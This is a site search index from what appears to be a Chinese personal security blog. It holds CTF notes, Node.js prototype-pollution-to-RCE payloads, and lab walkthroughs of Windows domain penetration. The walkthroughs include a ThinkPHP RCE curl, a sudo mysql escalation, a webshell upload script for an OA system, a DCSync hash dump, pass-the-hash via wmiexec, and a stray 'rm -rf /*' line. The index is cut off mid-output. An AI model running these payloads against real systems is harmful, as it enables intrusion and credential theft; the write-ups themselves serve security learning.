{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u6625\u5929\u7684\u82b1\u5f00\u79cb\u5929\u7684\u98ce\u4ee5\u53ca\u51ac\u5929\u7684\u843d\u9633","text":"<p>\u8bb0\u5f55\u4e00\u4e9b\u503c\u5f97\u4fdd\u5b58\u7684\u6587\u5b57\uff0c\u9632\u6b62\u4e22\u5931...</p> <p></p>"},{"location":"ctf/","title":"\u8bb0\u5f55\u6253\u8fc7\u7684\u5404\u79cdCTF\u6bd4\u8d5b","text":""},{"location":"ctf/2022/","title":"\u4e0d\u89c1\u4e86...","text":"<p>sudo rm -rf /*</p> <p>\u8fd9\u4e2a\u4eba\u7684\u81f4\u6001Tiplus5000\u57282023.11.9\u65e5\u6389\u76d8\u4e86\u3002</p>"},{"location":"ctf/2023/wmctf/","title":"wmctf","text":""},{"location":"ctf/2023/wmctf/#ezblog","title":"ezblog","text":""},{"location":"web/","title":"WEB","text":"<p>\u6742\u4e71\u7684web\u5b66\u4e60\u7b14\u8bb0</p>"},{"location":"web/nodejs/proto2rce/","title":"nodejs \u539f\u578b\u94fe\u6c61\u67d3\u5230\u547d\u4ee4\u6267\u884c","text":"<p>Node</p> <p>\u539f\u578b\u94fe\u6c61\u67d3\u662fnodejs\u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u4f46\u5982\u4f55\u5229\u7528\u539f\u578b\u94fe\u6c61\u67d3\u6700\u7ec8\u547d\u4ee4\u6267\u884c\u5f80\u5f80\u9700\u8981\u7ed3\u5408\u4e00\u4e9b\u7b2c\u4e09\u65b9\u5e93\u3002 \u5176\u5b9e\u5728nodejs\u7684\u6e90\u7801\u4e2d\uff0c\u4e5f\u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684\u5730\u65b9\u3002</p>"},{"location":"web/nodejs/proto2rce/#_1","title":"\u7814\u7a76\u751f\u8d5b\u4e2d\u7684\u4e00\u9053\u9898","text":"\u4e3b\u8981\u4ee3\u7801 app.js <pre><code>const express = require(\"express\");\nconst merge = require(\"./utils/merge\");\nconst fs = require(\"fs\");\nconst multer = require(\"multer\");\nconst bodyParser = require(\"body-parser\");\nconst { execSync } = require(\"child_process\");\nconst PORT = process.env.PORT || 81;\nconst app = express();\n\nvar db = [];\nvar objMulter = multer({ dest: \"./public/upload\" });\napp.use(objMulter.any());\napp.use(express.static(\"./public\"));\napp.use(bodyParser.urlencoded());\n\napp.post(\"/upload\", (req, res) =&gt; {\n\n    try{\n\n        console.log(req.files)\n        let oldPath = req.files[0].path;//[\"file:///app/public/flag\"]\n        let newPath = oldPath + \".jpg\";\n        let data = {type: \"image\", path: newPath};\n        fs.renameSync(oldPath, newPath);\n\n        merge(data, req.body);\n        db.push(data);\n        res.send(`&lt;script&gt;alert(\"upload in \" + location.origin  + \"${newPath.slice(6)}\");location=\"/\";&lt;/script&gt;`);\n        return;\n    }catch{\n        res.send(\"&lt;script&gt;alert('\u51fa\u9519\u4e86\uff01');location='/';&lt;/script&gt;\");\n        return;\n    }\n});\n\napp.get(\"/getImg\", (req, res) =&gt; {\n    res.send(db);\n    return;\n});\n\napp.get(\"/rm\", (req, res) =&gt; {\n    try{\n        console.log(\"a\")\n        execSync(\"rm -rf /app/public/upload/*\");\n        db = [];\n        res.send(\"&lt;script&gt;alert('\u5168\u90fd\u5220\u5b8c\u55bd\uff01');location='/';&lt;/script&gt;\")\n        return;\n    } catch{\n        res.send(\"&lt;script&gt;alert('\u51fa\u9519\u4e86\uff01');location='/';&lt;/script&gt;\");\n        return;\n    }\n});\n\napp.listen(PORT, () =&gt; {\n    console.log(`listen at ${PORT}`);\n});\n</code></pre> <p>\u4e0a\u9762\u7684\u9898\u76ee\u901a\u8fc7\u4e0b\u9762\u7684\u8bf7\u6c42\uff0c\u53ef\u4ee5\u5bb9\u6613\u7684\u539f\u578b\u94fe\u6c61\u67d3\u3002 <pre><code>POST /upload HTTP/1.1\nHost: 127.0.0.1:81\nUser-Agent: python-requests/2.31.0\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nConnection: close\nContent-Length: 300\nContent-Type: multipart/form-data; boundary=df16a984e58633372c92c2c1268ca06e\n\n--df16a984e58633372c92c2c1268ca06e\nContent-Disposition: form-data; name=\"constructor[prototype][fileFilter]\"\n\n111111111\n--df16a984e58633372c92c2c1268ca06e\nContent-Disposition: form-data; name=\"image\"; filename=\"1.txt\"\nContent-Type: text/plain\n\n13123123\n--df16a984e58633372c92c2c1268ca06e--\n</code></pre></p> <p>\u4f46\u6bd4\u8d5b\u73b0\u573a\u6ca1\u6709\u627e\u5230\u6700\u540erce\u7684\u65b9\u6cd5\u3002\u8d5b\u540e\u627e\u5230\u4e86\u51e0\u7bc7\u6587\u7ae0\u3002</p> <p>Prototype-pollution-to-rce</p> <p>https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce</p>"},{"location":"web/nodejs/proto2rce/#child_process","title":"child_process","text":""},{"location":"web/nodejs/proto2rce/#exec","title":"exec","text":"<p><pre><code>// environ trick - not working\n// It's not possible to pollute the .env attr to create a first env var\n// because options.env is null (not undefined)\n\n// cmdline trick - working with small variation\n// Working after kEmptyObject (fix)\nconst { exec } = require('child_process');\np = {}\np.__proto__.shell = \"/proc/self/exe\" //You need to make sure the node executable is executed\np.__proto__.argv0 = \"console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//\"\np.__proto__.NODE_OPTIONS = \"--require /proc/self/cmdline\"\nvar proc = exec('something');\n\n// stdin trick - not working\n// Not using stdin\n\n// Windows\n// Working after kEmptyObject (fix)\nconst { exec } = require('child_process');\np = {}\np.__proto__.shell = \"\\\\\\\\127.0.0.1\\\\C$\\\\Windows\\\\System32\\\\calc.exe\"\nvar proc = exec('something');\n</code></pre> </p> <p>\u7ed3\u5408\u4e0a\u9762\u7684paylaod\uff0c\u518d\u901a\u8fc7\u8c03\u8bd5node\u6e90\u7801\uff0c\u53d1\u73b0\u5728normalizeExecArgs\u51fd\u6570\u4e2d\u7684options.shell\u7684\u786e\u53ef\u4ee5\u88ab\u6c61\u67d3\u3002  \u901a\u8fc7\u8f93\u51fa\u53ef\u4ee5\u77e5\u9053options.shell\u63a7\u5236\u4e86</p> <p>\u7ee7\u7eed\u8ddf\u8fdb\u53ef\u4ee5\u5728normalizeExecFileArgs \u4e2d\u53d1\u73b0\u53e6\u4e00\u4e2a\u53ef\u4ee5\u6c61\u67d3\u7684\u53d8\u91cfargv0\u3002 </p> <p>\u8ddf\u5230normalizeSpawnArguments \u4e2d\u53ef\u4ee5\u770b\u5230\u5c06argv0\u63d2\u5230args\u7684\u6700\u524d\u9762\uff0c\u5e76\u6839\u636e\u4e0d\u540c\u7684\u5e73\u53f0\u9009\u62e9\u4e0d\u540c\u7684shell\u3002 </p> <p>\u6700\u540e\u53ef\u4ee5\u8ddf\u5230\u8c03\u7528this._handle.spawn(options);\u518d\u5f80\u4e0b\u5c31\u8981\u8c03\u8bd5c++\u6e90\u7801\u4e86\u3002 </p> <p>\u4f46\u8fd8\u6ca1\u51fa\u73b0NODE_OPTIONS\u8fd9\u4e2a\u53d8\u91cf,\u53bb\u67e5\u6587\u6863\u6700\u540e\u77e5\u9053\u662f\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u7684\u65b9\u5f0f\u5bfc\u5165\u6a21\u5757.\u5177\u4f53\u4e3a\u4ec0\u4e48\u8981\u5bfc\u5165\u5c31\u6682\u65f6\u4e0d\u63a2\u7a76\u4e86.</p> <p>NODE_OPTIONS</p> <p>NODE_OPTIONS </p>"},{"location":"web/nodejs/proto2rce/#execsync","title":"execSync","text":"<p>\u548c\u4e0a\u9762exec\u4e00\u6837\u7684paylaod\u4e5f\u662f\u53ef\u4ee5\u89e6\u53d1\u7684,\u4e0d\u8fc7\u6700\u540e\u4f1a\u62a5\u9519. \u6587\u7ae0\u4e2d\u7ed9\u7684\u4e0b\u9762\u7684\u65b9\u5f0f\u4e5f\u662f\u53ef\u4ee5\u7684,\u6700\u540e\u540c\u6837\u4f1a\u62a5\u9519. <pre><code>// environ trick - working with small variation (shell and argv0)\n// Working after kEmptyObject (fix)\nconst { execSync } = require('child_process');\np = {}\n// If in windows or mac you need to change the following params to the path of ndoe\np.__proto__.argv0 = \"/proc/self/exe\" //You need to make sure the node executable is executed\np.__proto__.shell = \"/proc/self/exe\" //You need to make sure the node executable is executed\np.__proto__.env = { \"EVIL\":\"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//\"}\np.__proto__.NODE_OPTIONS = \"--require /proc/self/environ\"\nvar proc = execSync('something');\n</code></pre></p>"},{"location":"web/nodejs/proto2rce/#fsrenamesync","title":"fs.renameSync","text":"<p>\u518d\u8d34\u4e00\u4e2afs\u4e2d\u7684\u7528\u6765\u91cd\u547d\u540d\u6587\u4ef6\u7684 <pre><code>const fs = require(\"fs\");\n\nb = [\"file:///tmp/execSync-environ\"]\n\na = {}\n\na.__proto__.href = \"file:///etc/passwd\"\n\na.__proto__.origin = \"a\"\na.__proto__.protocol=\"file:\"\na.__proto__.password =\"\"\na.__proto__.username = \"\"\na.__proto__.port = \"\"\na.__proto__.search = \"\"\na.__proto__.hostname = \"\"\na.__proto__.pathname = \"/etc/passwd\"\nfs.renameSync(b,\"file:///tmp/execSync-environ222\")\n</code></pre> \u95ee\u9898\u51fa\u5728getValidatedPath\u4e2d </p> <p>Abstract</p> <p>\u4f46\u8fd9\u4e2a\u5176\u5b9e\u8fd8\u633a\u9e21\u808b\u7684,\u9700\u8981\u4f20\u5165renameSync\u7684\u7b2c\u4e00\u53c2\u6570\u662f\u6570\u7ec4,\u6240\u4ee5\u7528\u5904\u4e0d\u5927.</p>"},{"location":"web/shentou/","title":"\u4ece\u5934\u5b66\u8d77\u57df\u6e17\u900f","text":""},{"location":"web/shentou/windows/basic/","title":"windows\u57df\u57fa\u7840","text":""},{"location":"web/shentou/windows/dcsync/","title":"DCSync","text":""},{"location":"web/shentou/yunjing/Initial/","title":"Initial","text":"<p>Note</p> <p>\u6625\u79cb\u4e91\u955c\u4e2d\u4e00\u5957\u7b80\u5355\u7684\u57df\u6e17\u900f\u9776\u573a\uff0c\u4e3b\u8981\u7528\u6765\u719f\u6089\u57df\u4e2d\u7684\u57fa\u672c\u6e17\u900f\u6d41\u7a0b\u3002 \u7b14\u8bb0\u4e3b\u8981\u5bf9\u6d41\u7a0b\u3001\u547d\u4ee4\u8fdb\u884c\u8bb0\u5f55\u3002</p> <p><code>DCSync</code></p>"},{"location":"web/shentou/yunjing/Initial/#mysql-sudo","title":"\u5916\u56f4\u6253\u70b9&amp;mysql sudo\u63d0\u6743","text":"<p>thinkphp 5.0.3 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c <pre><code>curl \"http://39.99.244.32/?s=captcha&amp;test=-1\" -d \"_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1\"`\n</code></pre> <pre><code>sudo -l \nMatching Defaults entries for www-data on ubuntu-web01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on ubuntu-web01:\n    (root) NOPASSWD: /usr/bin/mysql\n</code></pre> <pre><code>sudo mysql -e '! cat /root/flag/flag01.txt'\n</code></pre> <pre><code>root@ubuntu-web01:/tmp# cat /root/flag/flag01.txt \n \u2588\u2588     \u2588\u2588 \u2588\u2588     \u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2588       \u2588\u2588     \u2588\u2588\u2588\u2588     \u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n\u2591\u2591\u2588\u2588   \u2588\u2588 \u2591\u2588\u2588    \u2588\u2588\u2588\u2588     \u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2588\u2588 \u2591\u2588\u2588\u2591\u2591\u2591\u2591\u2588\u2588     \u2588\u2588\u2588\u2588   \u2591\u2588\u2588\u2591\u2588\u2588   \u2591\u2588\u2588  \u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2588\u2588\n \u2591\u2591\u2588\u2588 \u2588\u2588  \u2591\u2588\u2588   \u2588\u2588\u2591\u2591\u2588\u2588   \u2588\u2588     \u2591\u2591\u2588\u2588\u2591\u2588\u2588   \u2591\u2588\u2588    \u2588\u2588\u2591\u2591\u2588\u2588  \u2591\u2588\u2588\u2591\u2591\u2588\u2588  \u2591\u2588\u2588 \u2588\u2588      \u2591\u2591 \n  \u2591\u2591\u2588\u2588\u2588   \u2591\u2588\u2588  \u2588\u2588  \u2591\u2591\u2588\u2588 \u2591\u2588\u2588      \u2591\u2588\u2588\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2588\u2588  \u2591\u2591\u2588\u2588 \u2591\u2588\u2588 \u2591\u2591\u2588\u2588 \u2591\u2588\u2588\u2591\u2588\u2588         \n   \u2588\u2588\u2591\u2588\u2588  \u2591\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2588\u2588      \u2591\u2588\u2588\u2591\u2588\u2588\u2591\u2591\u2591\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2588\u2588  \u2591\u2591\u2588\u2588\u2591\u2588\u2588\u2591\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\n  \u2588\u2588 \u2591\u2591\u2588\u2588 \u2591\u2588\u2588\u2591\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2591\u2591\u2588\u2588     \u2588\u2588 \u2591\u2588\u2588  \u2591\u2591\u2588\u2588 \u2591\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2591\u2588\u2588   \u2591\u2591\u2588\u2588\u2588\u2588\u2591\u2591\u2588\u2588  \u2591\u2591\u2591\u2591\u2588\u2588\n \u2588\u2588   \u2591\u2591\u2588\u2588\u2591\u2588\u2588\u2591\u2588\u2588     \u2591\u2588\u2588 \u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2591\u2588\u2588   \u2591\u2591\u2588\u2588\u2591\u2588\u2588     \u2591\u2588\u2588\u2591\u2588\u2588    \u2591\u2591\u2588\u2588\u2588 \u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n\u2591\u2591     \u2591\u2591 \u2591\u2591 \u2591\u2591      \u2591\u2591   \u2591\u2591\u2591\u2591\u2591\u2591\u2591   \u2591\u2591     \u2591\u2591 \u2591\u2591      \u2591\u2591 \u2591\u2591      \u2591\u2591\u2591   \u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591  \n\nCongratulations!!! You found the first flag, the next flag may be in a server in the internal network.\n\nflag01: flag{60b53231-\n</code></pre></p>"},{"location":"web/shentou/yunjing/Initial/#_1","title":"\u5185\u7f51\u63a2\u6d4b","text":"<p>ssh \u4ee3\u7406socks5</p> ssh\u5185\u7f51\u4ee3\u7406 <p>\u5185\u7f51\u6e17\u900f\u4e4b\u4ee3\u7406\u8f6c\u53d1</p> <pre><code>ssh -f -N -D 127.0.0.1:7788 root@39.99.244.32\n</code></pre> <pre><code>root@ubuntu-web01:/tmp# ./fscan_386  -h 172.22.0.0/16\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.2\nstart infoscan\n(icmp) Target 172.22.1.15     is alive\n(icmp) Target 172.22.1.2      is alive\n(icmp) Target 172.22.1.21     is alive\n(icmp) Target 172.22.1.18     is alive\n(icmp) Target 172.22.255.253  is alive\n[*] LiveTop 172.22.0.0/16    \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a: 5\n[*] LiveTop 172.22.1.0/24    \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a: 4\n[*] Icmp alive hosts len is: 5\n[*] LiveTop 172.22.255.0/24  \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a: 1\n172.22.1.18:3306 open\n172.22.1.2:445 open\n172.22.1.18:445 open\n172.22.1.21:445 open\n172.22.1.21:139 open\n172.22.1.2:139 open\n172.22.1.18:135 open\n172.22.1.21:135 open\n172.22.1.2:135 open\n172.22.1.18:80 open\n172.22.1.2:88 open\n172.22.1.18:139 open\n[*] alive ports len is: 12\nstart vulscan\n[*] NetInfo:\n[*]172.22.1.2\n   [-&gt;]DC01\n   [-&gt;]172.22.1.2\n[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)\n[+] 172.22.1.21 MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)\n[*] NetInfo:\n[*]172.22.1.21\n   [-&gt;]XIAORANG-WIN7\n   [-&gt;]172.22.1.21\n[*] NetInfo:\n[*]172.22.1.18\n   [-&gt;]XIAORANG-OA01\n   [-&gt;]172.22.1.18\n[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 \n[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 \n[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 \n[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None \u8df3\u8f6curl: http://172.22.1.18?m=login\n[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:\u4fe1\u547c\u534f\u540c\u529e\u516c\u7cfb\u7edf\n\u5df2\u5b8c\u6210 12/12\n[*] \u626b\u63cf\u7ed3\u675f,\u8017\u65f6: 14.826555053s\n</code></pre>"},{"location":"web/shentou/yunjing/Initial/#_2","title":"\u4fe1\u547c\u534f\u540c\u529e\u516c\u7cfb\u7edf","text":"<p>http://172.22.1.18?m=login code:200 len:4012   title:\u4fe1\u547c\u534f\u540c\u529e\u516c\u7cfb\u7edf</p> \u4fe1\u547c\u534f\u540c\u529e\u516c\u7cfb\u7edf webshell \u4e0a\u4f20 <pre><code>import requests\n\n\nsession = requests.session()\n\nurl_pre = 'http://172.22.1.18/'\nurl1 = url_pre + '?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'\nurl2 = url_pre + '/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'\nurl3 = url_pre + '/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11'\n\ndata1 = {\n    'rempass': '0',\n    'jmpass': 'false',\n    'device': '1625884034525',\n    'ltype': '0',\n    'adminuser': 'admin',\n    'adminpass': 'admin123',\n    'yanzm': ''\n}\n\n\n# r = session.post(url1, data=data1)\nr = session.post(url2, files={'file': open('2.php', 'r+')},headers={\"Cookie\":\"\"\"PHPSESSID=m0no0rha86fdfh48tvudeui43q;     deviceid=1699269859036; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0;     xinhu_mo_adminid=jl0pr0xl0mrj0jj0lx0mrd0muu0jj0ll0jj0pl011\"\"\"})\n\nprint(r.text)\nfilepath = str(r.json()['filepath'])\nfilepath = \"/\" + filepath.split('.uptemp')[0] + '.php'\nid = r.json()['id']\n\nurl3 = url_pre + f'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}'\n\nr = session.get(url3)\nr = session.get(url_pre + filepath + \"?1=system('whoami');\")\nprint(url_pre + filepath + \"?1=system('whoami');\")\nprint(r.text)\n</code></pre> <pre><code>http://172.22.1.18//upload/2023-11/06_19373422.php\n\n ___    ___ ___  ________  ________  ________  ________  ________   ________     \n|\\  \\  /  /|\\  \\|\\   __  \\|\\   __  \\|\\   __  \\|\\   __  \\|\\   ___  \\|\\   ____\\    \n\\ \\  \\/  / | \\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\\\ \\  \\ \\  \\___|    \n \\ \\    / / \\ \\  \\ \\   __  \\ \\  \\\\\\  \\ \\   _  _\\ \\   __  \\ \\  \\\\ \\  \\ \\  \\  ___  \n  /     \\/   \\ \\  \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\  \\\\ \\  \\ \\  \\ \\  \\\\ \\  \\ \\  \\|\\  \\ \n /  /\\   \\    \\ \\__\\ \\__\\ \\__\\ \\_______\\ \\__\\\\ _\\\\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\_______\\\n/__/ /\\ __\\    \\|__|\\|__|\\|__|\\|_______|\\|__|\\|__|\\|__|\\|__|\\|__| \\|__|\\|_______|\n|__|/ \\|__|                                                                      \n\n\nflag02: 2ce3-4813-87d4-\n\nAwesome! ! ! You found the second flag, now you can attack the domain controller.\n</code></pre>"},{"location":"web/shentou/yunjing/Initial/#_3","title":"\u57df\u6e17\u900f","text":"<p>MS17-010 \u6c38\u6052\u4e4b\u84dd \u6253 win7,\u5229\u7528win7\u7684dcsync \u6743\u9650\u83b7\u53d6\u7ba1\u7406\u5458hash</p> <pre><code>meterpreter &gt; kiwi_cmd lsadump::dcsync /all /csv\n[proxychains] DLL init: proxychains-ng 4.14\n[proxychains] DLL init: proxychains-ng 4.14\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC01.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514\n1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512\n1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512\n500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512\n1000    DC01$   3d7b0fadfff45c4a7576c8def5df9b94        532480\n1104    XIAORANG-OA01$  6e34e436d141d2498d2dff54ffee66d0        4096\n1108    XIAORANG-WIN7$  6c3868d13dae5a2ae04061ab7f94e717        4096\n</code></pre> <p>\u901a\u8fc7ntml\uff0c\u5229\u7528wmiexec\u83b7\u53d6\u4ea4\u4e92shell <pre><code>proxychains python3 examples/wmiexec.py xiaorang.lab/Administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8  -codec GBK\n</code></pre></p>"},{"location":"web/shentou/yunjing/Tsclient/","title":"Tsclient","text":"<p>Note</p> <p>\u6625\u79cb\u4e91\u955c\u4e2d\u4e00\u5957\u96be\u5ea6\u4e2d\u7b49\u7684\u57df\u6e17\u900f\u9776\u573a\uff0c\u53ef\u4ee5\u8fdb\u4e00\u6b65\u719f\u6089\u57df\u4e2d\u7684\u6e17\u900f\u6d41\u7a0b\u3002 \u7b14\u8bb0\u4e3b\u8981\u5bf9\u6d41\u7a0b\u3001\u547d\u4ee4\u8fdb\u884c\u8bb0\u5f55\u3002</p> <p><code>\u63d0\u6743</code></p>"},{"location":"web/shentou/yunjing/Tsclient/#_1","title":"\u8d44\u4ea7\u63a2\u6d4b","text":"<pre><code>\u250c\u2500\u2500(nama\u327fNama)-[/usr/share/windows-resources/mimikatz]\n\u2514\u2500$ nmap 39.98.115.192\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-07 13:18 CST\nNmap scan report for 39.98.115.192\nHost is up (0.011s latency).\nNot shown: 990 closed tcp ports (conn-refused)\nPORT     STATE    SERVICE\n80/tcp   open     http\n135/tcp  open     msrpc\n139/tcp  open     netbios-ssn\n445/tcp  filtered microsoft-ds\n1433/tcp open     ms-sql-s\n2383/tcp open     ms-olap4\n3389/tcp open     ms-wbt-server\n4444/tcp filtered krb524\n5800/tcp filtered vnc-http\n5900/tcp filtered vnc\n\nNmap done: 1 IP address (1 host up) scanned in 3.82 seconds\n\n[*] alive ports len is: 218\nstart vulscan\n[*] WebTitle: http://39.98.115.192      code:200 len:703    title:IIS Windows Server\n[*] NetInfo:\n[*]39.98.115.192\n   [-&gt;]WIN-WEB\n   [-&gt;]172.22.8.18\n[+] mssql:39.98.115.192:1433:sa 1qaz!QAZ\n</code></pre> <p>\u5bf9\u5f00\u653e\u7aef\u53e3\u8fdb\u4e00\u6b65\u8be6\u7ec6\u63a2\u6d4b <pre><code>\u250c\u2500\u2500(nama\u327fNama)-[/usr/share/windows-resources/mimikatz]\n\u2514\u2500$ sudo nmap -sS -sV -sC -O -p80,1433,2383,3389 39.98.115.192\n[sudo] password for nama:\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-07 13:37 CST\nNmap scan report for 39.98.115.192\nHost is up (0.010s latency).\n\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM\n| ms-sql-info:\n|   39.98.115.192:1433:\n|     Version:\n|       name: Microsoft SQL Server 2016 RTM\n|       number: 13.00.1601.00\n|       Product: Microsoft SQL Server 2016\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_ssl-date: 2023-11-07T05:38:36+00:00; +1s from scanner time.\n| ms-sql-ntlm-info:\n|   39.98.115.192:1433:\n|     Target_Name: WIN-WEB\n|     NetBIOS_Domain_Name: WIN-WEB\n|     NetBIOS_Computer_Name: WIN-WEB\n|     DNS_Domain_Name: WIN-WEB\n|     DNS_Computer_Name: WIN-WEB\n|_    Product_Version: 10.0.14393\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2023-11-07T05:17:52\n|_Not valid after:  2053-11-07T05:17:52\n2383/tcp open  ms-olap4?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: WIN-WEB\n|   NetBIOS_Domain_Name: WIN-WEB\n|   NetBIOS_Computer_Name: WIN-WEB\n|   DNS_Domain_Name: WIN-WEB\n|   DNS_Computer_Name: WIN-WEB\n|   Product_Version: 10.0.14393\n|_  System_Time: 2023-11-07T05:38:31+00:00\n| ssl-cert: Subject: commonName=WIN-WEB\n| Not valid before: 2023-11-06T05:17:41\n|_Not valid after:  2024-05-07T05:17:41\n|_ssl-date: 2023-11-07T05:38:36+00:00; +1s from scanner time.\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|7|2016 (90%)\nOS CPE: cpe:/o:microsoft:windows_10:1607 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows 10 1607 (90%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 7 Professional (87%), Microsoft Windows Server 2016 (87%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 45.22 seconds\n</code></pre></p>"},{"location":"web/shentou/yunjing/Tsclient/#mssql-getshell","title":"mssql \u5f31\u53e3\u4ee4 getshell","text":"<p>mssql getshell</p> Note <p>\u597d\u7528\u7684\u6570\u636e\u5e93\u7684\u96c6\u6210\u5229\u7528\u5de5\u5177MDUT</p> <p>\u4e0avhell,\u6536\u96c6\u57fa\u672c\u4fe1\u606f <pre><code>C:\\Windows\\system32&gt;whoami /all\n\n\u7528\u6237\u4fe1\u606f\n----------------\n\n\u7528\u6237\u540d                 SID\n====================== ===============================================================\nnt service\\mssqlserver S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003\n\n\n\u7ec4\u4fe1\u606f\n-----------------\n\n\u7ec4\u540d                                 \u7c7b\u578b   SID                                            \u5c5e\u6027\n==================================== ====== ============================================== ==============================\nMandatory Label\\High Mandatory Level \u6807\u7b7e   S-1-16-12288\nEveryone                             \u5df2\u77e5\u7ec4 S-1-1-0                                        \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nWIN-WEB\\PdwComputeNodeAccess         \u522b\u540d   S-1-5-21-4088072006-1921831747-1237773115-1003 \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nBUILTIN\\Performance Monitor Users    \u522b\u540d   S-1-5-32-558                                   \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nBUILTIN\\Users                        \u522b\u540d   S-1-5-32-545                                   \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT AUTHORITY\\SERVICE                 \u5df2\u77e5\u7ec4 S-1-5-6                                        \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nCONSOLE LOGON                        \u5df2\u77e5\u7ec4 S-1-2-1                                        \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT AUTHORITY\\Authenticated Users     \u5df2\u77e5\u7ec4 S-1-5-11                                       \u5fc5\u9700\u7684\u7ec4, 